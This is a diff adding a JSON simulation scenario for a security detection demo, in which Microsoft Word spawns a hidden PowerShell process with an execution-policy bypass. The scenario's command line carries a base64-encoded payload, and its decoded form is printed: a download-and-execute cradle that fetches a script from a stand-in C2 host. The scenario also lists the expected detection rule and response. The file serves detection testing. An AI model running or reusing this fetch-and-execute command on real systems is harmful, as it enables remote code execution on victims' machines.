@@ -1,0 +1,36 @@
+{
+  "scenario_id": "SCENARIO_02_SUSPICIOUS_POWERSHELL",
+  "title": "Obfuscated & Encoded PowerShell Execution",
+  "description": "Adversary executes a hidden, base64-encoded PowerShell script attempting memory injection and unconstrained execution policy bypass.",
+  "is_simulation": true,
+  "mitre_technique": "T1059.001",
+  "target_device": "DEV-DEMO-WORKSTATION-01",
+  "events": [
+    {
+      "event_id": "sim-ps-0001",
+      "timestamp": "2026-09-16T09:05:00.000Z",
+      "device_id": "DEV-DEMO-WORKSTATION-01",
+      "event_type": "PROCESS_EXECUTION",
+      "severity": "CRITICAL",
+      "source": "cyber-sentinel-demo-simulator",
+      "isSimulation": true,
+      "user": { "name": "victim_user", "domain": "CORP", "is_admin": false },
+      "process": {
+        "name": "powershell.exe",
+        "pid": 5824,
+        "ppid": 1420,
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_name": "WINWORD.EXE",
+        "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAGMAbwByAHAALgBuAGUAdAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+        "hash": "3581d0d02ce6b3ae7b844af4ea7a12c167f4ac853b3a47de43fd0885ff305f00"
+      },
+      "details": {
+        "decodedPayload": "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil-corp.net/payload.ps1')",
+        "spawnedBy": "Microsoft Word Macro"
+      }
+    }
+  ],
+  "expected_detection_rule": "RULE_OBFUSCATED_POWERSHELL_002",
+  "expected_mitre_technique": "T1059.001 - Command and Scripting: PowerShell",
+  "recommended_response": "TERMINATE_PROCESS (PID: 5824) & ISOLATE_ENDPOINT"
+}
